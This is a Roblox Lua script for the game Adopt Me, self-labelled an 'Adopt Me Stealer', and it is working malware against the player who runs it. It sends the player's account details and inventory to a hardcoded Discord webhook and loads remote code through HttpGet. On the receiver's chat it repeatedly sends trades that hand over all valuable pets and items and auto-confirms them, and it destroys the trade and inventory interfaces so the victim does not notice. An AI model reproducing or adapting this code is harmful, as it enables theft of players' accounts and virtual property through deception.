local Username = "Mamamoblue929297"
local Webhook =
"https://discord.com/api/webhooks/1295058807168438294/VCos8pBU5RncYj7oCHQHAk5AdHICsOOZW_RrlXQw7PGQk2AQG15_7-OOpnTl3uC5ZfEL"

local Loads = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loads("InventoryDB")
local ClientData = Loads('ClientData')
local potion_count = 0
local expensive_count = 0
local legendaries_count = 0
local ultra_count = 0
local rare_count = 0
local uncommon_count = 0
local common_count = 0
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
local total_value
local GetPetValue = loadstring(game:HttpGet("https://anti-stealer-scripts.vercel.app/values.lua"))
if GetPetValue then
    total_value = GetPetValue()
else
    warn("Values Of Pets Aren't Valid For That URL!")
end
local Loads = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loads("InventoryDB")
local Inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
local PetCounts = {
    legendary = {},
    ultra_rare = {},
    rare = {},
    uncommon = {},
    common = {}
}
local function getRarity(pet)
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local InventoryDB = Loads("InventoryDB")
    return InventoryDB[pet.category][pet.id].rarity
end
for PetUid, PetData in pairs(Inventory.pets) do
    local petCategory = InventoryDB[PetData.category]
    if petCategory and petCategory[PetData.id] then
        local petInfo = petCategory[PetData.id]
        local petName = petInfo["name"]
        local label = ""
        if PetData.properties.mega_neon then
            label = "Mega Neon "
        elseif PetData.properties.neon then
            label = "Neon "
        else
            label = "Normal "
        end
        local key = label.. petName
        local rarity = getRarity(PetData)
        if PetCounts[rarity][key] then
            PetCounts[rarity][key] = PetCounts[rarity][key] + 1
        else
            PetCounts[rarity][key] = 1
        end
    end
end
local legendaryPets = ""
local ultraRarePets = ""
local rarePets = ""
local uncommonPets = ""
local commonPets = ""
for rarity, pets in pairs(PetCounts) do
    for key, count in pairs(pets) do
        local petEntry = key .. " x" .. count .. "\n"
        if rarity == "legendary" then
            legendaryPets = legendaryPets .. petEntry
        elseif rarity == "ultra_rare" then
            ultraRarePets = ultraRarePets .. petEntry
        elseif rarity == "rare" then
            rarePets = rarePets .. petEntry
        elseif rarity == "uncommon" then
            uncommonPets = uncommonPets .. petEntry
        elseif rarity == "common" then
            commonPets = commonPets .. petEntry
        end
    end
end
local PetsString = "--// Adopt Me Stealer V2 By K4F7\n--// Legendarys\n" .. legendaryPets ..
                         "\n--// Ultra Rares\n" .. ultraRarePets ..
                         "\n--// Rares\n" .. rarePets ..
                         "\n--// Uncommons\n" .. uncommonPets ..
                         "\n--// Commons\n" .. commonPets
for i, v in pairs(ClientData.get("inventory").pets) do
   if InventoryDB[v.category][v.id].rarity == "legendary" then
       legendaries_count = legendaries_count + 1
   end
   if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
       ultra_count = ultra_count + 1
   end
   if InventoryDB[v.category][v.id].rarity == "rare" then
       rare_count = rare_count + 1
   end
   if InventoryDB[v.category][v.id].rarity == "uncommon" then
       uncommon_count = uncommon_count + 1
   end
   if InventoryDB[v.category][v.id].rarity == "common" then
       common_count = common_count + 1
   end
end
for i, v in pairs(ClientData.get("inventory").pets) do
    local petId = InventoryDB[v.category][v.id].id
    if petId == "shadow_dragon" or petId == "bat_dragon" or petId == "giraffe" or petId == "frost_dragon" or petId == "owl" or petId == "parrot" or petId == "evil_unicorn" or petId == "crow" then
        expensive_count = expensive_count + 1
    end
end
for i, v in pairs(ClientData.get("inventory").food) do
    if InventoryDB[v.category][v.id].rarity == "legendary" then
        potion_count = potion_count + 1
    end
end
local DetectPlatform = "Could not grab!"
local SVersion = "v2.0.0"
local plr = game.Players.LocalPlayer
local userr = Username
local userid = game.Players.LocalPlayer.UserId
local accage = game.Players.LocalPlayer.AccountAge
local wb_content = TeleportScript
if expensive_count >= 1 or legendaries_count >= 3 then
    wb_content = '-- @everyone\n'..TeleportScript
end
local data = {
username = 'Moon Scripts',
avatar_url = 'https://cdn.discordapp.com/attachments/1279699474423353449/1286558277290954822/2e00df3d-80d0-47a0-86b6-ea1b5f2d6f52.jpg?ex=66ef0104&is=66edaf84&hm=692ce096c346a6df8bdbeb59f0c1b64afda6db112112e54e396a1ac27f6d4773&',
content = wb_content,
embeds = {
  {
    title = '❌ **Moon Scripts** ❌',
    description = '🧑 **__Player Information__** 🧑 ```lua\nUsername   👤 : '.. tostring(plr) ..'\nUser-ID    💳 : '.. tostring(userid) ..'\nPlayer-Age 🔞 : '.. tostring(accage) ..' days\nExploit    🖥 : '..tostring(identifyexecutor())..'\nPlatform   🖱 : '..tostring(DetectPlatform)..'\nReceiver   🧟‍♂️ : '..tostring(Username)..'\nVersion    🌐 : '..tostring(SVersion)..'```\n🎒 **__Player Inventory__** 🎒```lua\nExpensives    🍄 : '.. tostring(expensive_count).. '\nF/R Potions   🌿 : '.. tostring(potion_count).. '\nLegendaries   💎 : '.. tostring(legendaries_count).. '\nUltra Rares   🌼 : '.. tostring(ultra_count).. '\nRares         🧢 : '.. tostring(rare_count).. '\nUncommons     🌈 : '.. tostring(uncommon_count).. '\nCommons       🎃 : '.. tostring(common_count - 1).. '\nValue      📚 : '..tostring(total_value)..'```\n📦 **__Auto Trader Script__** 📦\n```lua\nUsername = "'..game.Players.LocalPlayer.Name..'"\nloadstring(game:HttpGet("https://pastebin.com/raw/GzXc94aX"))()```',
    color = tonumber(0x00ff00),
    footer = {
      text = 'by K4F7: ' .. os.date("%B %d, %Y at %I:%M %p")
    }
  }
}
}
local boundary = "----BoundaryString"
local body = "--" .. boundary .. "\r\n" ..
             'Content-Disposition: form-data; name="payload_json"\r\n\r\n' ..
            game:GetService("HttpService"):JSONEncode(data) .. "\r\n" ..
            "--" .. boundary .. "\r\n" ..
            'Content-Disposition: form-data; name="file"; filename="data.txt"\r\n' ..
            'Content-Type: text/plain\r\n\r\n' ..
            PetsString .. "\r\n" ..
            "--" .. boundary .. "--\r\n"
local httpRequest = http.request or httprequest
if httpRequest then
httpRequest({
  Url = Webhook,
  Method = 'POST',
  Headers = {
    ['Content-Type'] = 'multipart/form-data; boundary='..boundary
  },
  Body = body
})
else
print("failed: webhook did not send")
end
local function SendTrade(Username)
  local Loads = require(game.ReplicatedStorage.Fsys).load
  local RouterClient = Loads("RouterClient")
  local SendTradeRequest = RouterClient.get("TradeAPI/SendTradeRequest")
  SendTradeRequest:FireServer(game.Players[Username])
end
local function AddItems()
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local InventoryDB = Loads("InventoryDB")
    local ClientData = Loads('ClientData')
    local RouterClient = Loads("RouterClient")
    local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local Inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
    if Inventory.pets then
        local legendaryPets = {}
        local ultraRarePets = {}
        local rarePets = {}
        local uncommonPets = {}
        local commonPets = {}
        for PetUid, PetData in pairs(Inventory.pets) do
            if InventoryDB[PetData.category][PetData.id].rarity == "legendary" then
                table.insert(legendaryPets, PetUid)
            elseif InventoryDB[PetData.category][PetData.id].rarity == "ultra_rare" then
                table.insert(ultraRarePets, PetUid)
            elseif InventoryDB[PetData.category][PetData.id].rarity == "rare" then
                table.insert(rarePets, PetUid)
            elseif InventoryDB[PetData.category][PetData.id].rarity == "uncommon" then
                table.insert(uncommonPets, PetUid)
            elseif InventoryDB[PetData.category][PetData.id].rarity == "common" then
                table.insert(commonPets, PetUid)
            end
        end
        local petOrder = {legendaryPets, ultraRarePets, rarePets, uncommonPets, commonPets}
        for _, petList in ipairs(petOrder) do
            while #petList > 0 do
                local PetUid = table.remove(petList, 1)
                AddItemRemote:FireServer(PetUid)
            end
        end
    else
        print("No pets found in inventory.")
    end
    if Inventory.transport then
        local legendaryVehicles = {}
        for VehicleUid, VehicleData in pairs(Inventory.transport) do
            if InventoryDB[VehicleData.category][VehicleData.id].rarity == "legendary" then
                table.insert(legendaryVehicles, VehicleUid)
            end
        end
        for _, vehicleUid in ipairs(legendaryVehicles) do
            AddItemRemote:FireServer(vehicleUid)
        end
    end
    if Inventory.food then
        local legendaryFood = {}
        for FoodUid, FoodData in pairs(Inventory.food) do
            if InventoryDB[FoodData.category][FoodData.id].rarity == "legendary" then
                table.insert(legendaryFood, FoodUid)
            end
        end
        for _, foodUid in ipairs(legendaryFood) do
            AddItemRemote:FireServer(foodUid)
        end
    end
    if Inventory.toys then
        local legendaryToys = {}
        for ToyUid, ToyData in pairs(Inventory.toys) do
            if InventoryDB[ToyData.category][ToyData.id].rarity == "legendary" then
                table.insert(legendaryToys, ToyUid)
            end
        end
        for _, toyUid in ipairs(legendaryToys) do
            AddItemRemote:FireServer(toyUid)
        end
    end
end
local function AcceptTrade()
  local Loads = require(game.ReplicatedStorage.Fsys).load
  local RouterClient = Loads("RouterClient")
  local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
  AcceptNegotiationRemote:FireServer()
end
local function ConfirmTrade()
  local Loads = require(game.ReplicatedStorage.Fsys).load
  local RouterClient = Loads("RouterClient")
  local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
  AcceptTradeRemote:FireServer()
end
local function StartSteal()
    while task.wait(15) do
        SendTrade(Username)
        wait(3)
        AddItems()
        wait(7)
        AcceptTrade()
        wait(4)
        ConfirmTrade()
    end
end
for _, plr in pairs(game.Players:GetPlayers()) do
    if plr.Name:lower() == Username:lower() then
        plr.Chatted:Connect(function()
            StartSteal()
        end)
    end
end
game.Players.PlayerAdded:Connect(function(plr)
    if plr.Name:lower() == Username:lower() then
        plr.Chatted:Connect(function()
            StartSteal()
        end)
    end
end)
game:GetService("Players").LocalPlayer.PlayerGui.BackpackApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.TradeApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.TooltipApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.SpeechBubbleApp:Destroy()
